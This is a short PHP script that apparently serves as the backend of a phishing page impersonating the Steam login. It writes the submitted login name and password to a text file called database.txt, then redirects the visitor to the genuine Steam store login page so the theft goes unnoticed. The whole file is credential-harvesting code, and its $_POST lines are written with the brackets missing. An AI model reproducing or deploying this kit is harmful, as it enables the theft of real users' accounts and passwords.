<?PHP

$Log = $_POST'login';

$Pass = $_POST'password';

$log = fopen("database.txt","at");

fwrite($log,"\n $Log:$Pass \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_lunarsale__global-header'></head></html>";

?>